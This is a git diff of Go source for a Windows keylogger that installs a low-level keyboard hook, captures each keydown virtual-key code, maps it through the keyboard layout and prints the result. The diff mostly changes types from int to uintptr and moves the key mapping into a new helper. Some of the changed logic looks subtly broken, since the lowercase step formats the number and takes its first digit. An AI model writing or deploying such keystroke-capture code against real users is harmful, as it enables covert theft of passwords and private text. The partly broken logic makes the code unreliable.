@@ -78,17 +78,16 @@ func (l *KeyLogger) ListenKeyboard() {
 	}
 }
 
-func (l *KeyLogger) keyboardLL(code int, wParam uintptr, lParam uintptr, outputFunc func(int)) uintptr {
+func (l *KeyLogger) keyboardLL(code int, wParam uintptr, lParam uintptr, outputFunc func(uintptr)) uintptr {
 	// Process only keydown events
 	if wParam == 256 {
 		kbd := (*KbdHookStruct)(unsafe.Pointer(lParam))
-		keyStroke := int(kbd.vkCode)
-		outputFunc(keyStroke)
+		outputFunc(kbd.vkCode)
 	}
 	return 0
 }
 
-func (l *KeyLogger) Save(keyStroke int) {
+func (l *KeyLogger) Save(keyStroke uintptr) {
 	var output strings.Builder
 
 	// Ignore mouse clicks
@@ -133,19 +132,19 @@ func (l *KeyLogger) Save(keyStroke int) {
 		}
 	}
 
+	var key = l.parseIntToVK(int(keyStroke), layout)
 	// Format key stroke
 	// Change FORMAT value to 10, 16, or any other number as needed
 	switch l.FORMAT {
 	case 10:
-		output.WriteString(fmt.Sprintf("[%d]", keyStroke))
+		output.WriteString(fmt.Sprintf("[%d]", key))
 	case 16:
-		output.WriteString(fmt.Sprintf("[%X]", keyStroke))
+		output.WriteString(fmt.Sprintf("[%X]", key))
 	default:
-		keyName, found := keyName[keyStroke]
+		keyName, found := keyName[key]
 		if found {
 			output.WriteString(keyName)
 		} else {
-			var key byte
 			lowercase := (l.GetKeyStateFunc(VK_CAPITAL) & 0x0001) == 0
 
 			// Check shift key
@@ -156,18 +155,12 @@ func (l *KeyLogger) Save(keyStroke int) {
 			}
 
 			// Map virtual key according to keyboard layout
-			virtualKey, err := l.manager.MapVirtualKeyEx(keyStroke, MAPVK_VK_TO_CHAR, layout)
-			if err != nil {
-				fmt.Println("Error mapping virtual key:", err)
-				return
-			}
 
-			key = byte(virtualKey)
 			// Convert to lowercase if needed
 			if !lowercase {
-				key = byte(strings.ToLower(string(key))[0])
+				key = uintptr(strings.ToLower(fmt.Sprint(key))[0])
 			}
-			output.WriteByte(key)
+			output.WriteByte(byte(key))
 		}
 	}
 
@@ -178,11 +171,20 @@ func (l *KeyLogger) Save(keyStroke int) {
 	fmt.Print(output.String())
 }
 
-func (l *KeyLogger) GetKeyStateFunc(keyCode int) int16 {
+func (l *KeyLogger) GetKeyStateFunc(keyCode uintptr) int16 {
 	r, err := l.manager.GetKeyState(keyCode)
 	if err != nil {
 		fmt.Println("Error getting key state:", err)
 		return 0
 	}
 	return r
+}
+
+func (l *KeyLogger) parseIntToVK(keyStroke int, layout uintptr) uintptr {
+	virtualKey, err := l.manager.MapVirtualKeyEx(keyStroke, MAPVK_VK_TO_CHAR, layout)
+	if err != nil {
+		fmt.Println("Error mapping virtual key:", err)
+		return 0
+	}
+	return virtualKey
 }
